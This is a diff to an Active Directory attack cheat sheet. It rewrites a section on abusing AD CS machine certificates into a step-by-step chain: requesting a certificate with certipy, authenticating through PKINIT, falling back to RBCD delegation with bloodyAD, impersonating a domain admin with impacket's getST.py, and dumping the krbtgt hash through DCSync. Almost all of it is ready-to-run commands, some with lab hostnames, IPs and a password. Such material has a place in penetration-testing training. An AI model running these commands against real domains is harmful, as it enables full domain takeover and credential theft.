@@ -25,14 +25,34 @@ Use certipy to request a certificate for the computer, using default 'Machine' t
 ```bash
 certipy req 'domain.local/COMPUTER_NAME$:COMPUTER_PASSWORD@ADCS_IP' -template Machine -dc-ip DC_IP -ca CA_NAME
 ```
-
+Then, use certipy tool to get a TGT by using a Kerberos authentication (PKINIT), using the certificate :
 ```bash              
+certipy auth -pfx ./DC.pfx -dc-ip 10.100.10.12
+```
+If it works, go to "HERE" section. Otherwise, use RBCD technique from bloodyAD. It will set up delegation rights :
+```bash
+openssl pkcs12 -in DC.pfx -out DC.pem -nodes
+python3 bloodyAD.py -d domain.local  -c ":DC.pem" -u 'COMPUTER_NAME$' --host DC_IP setRbcd 'COMPUTER_NAME$' 'DC_NAME$'
+```
+Then, try to impersonate a domain admin using impacket :
+```bash
+getST.py -spn LDAP/DC.DOMAIN.LOCAL -impersonate ADMIN_NAME -dc-ip DC_IP 'domain.local/COMPUTER_NAME$:COMPUTER_PASSWORD'
+```
+HERE - You'll get either the .ccache file (TGT) or the NT Hash. If you get the NT Hash, you know what to do next ;). It's linked to the DC computer account, so normally, you're admin. To use .ccache file :
+```bash
+cp XXXX.ccache /tmp/
+export KRB5CCNAME=/tmp/XXXX.ccache
+```
+Finally, use impacket to perform a DCSync with the exported TGT :
+```bash
+impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'domain.local/XXXX@DC.domain.local' -k -no-pass -dc-ip DC_IP -target-ip IP_ADDRESS 
+```
 
-certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12 OR openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes | python3 bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$'
+ OR  | python3 bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 setRbcd 'CVE$' 'CRASHDC$'
 getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
 cp emacron.ccache /tmp/
 export KRB5CCNAME=/tmp/emacron.ccache
-impacket-secretsdump -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
+
 ```
 
 ## CVE-2021-42278 & CVE-2021-42287 : Sam-The-Admin
